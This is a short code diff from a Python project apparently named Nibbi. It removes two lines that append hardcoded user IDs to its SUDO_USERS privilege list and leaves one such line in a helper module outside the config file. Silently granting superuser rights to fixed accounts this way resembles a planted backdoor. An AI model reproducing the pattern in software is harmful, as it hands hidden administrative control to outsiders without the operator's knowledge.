@@ -5,8 +5,6 @@ from Nibbi.Modules.helpers.admins import get_administrators
 from Nibbi.config import SUDO_USERS
 
 SUDO_USERS.append(5616461719)
-SUDO_USERS.append(5564084678)
-SUDO_USERS.append(5546969260)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
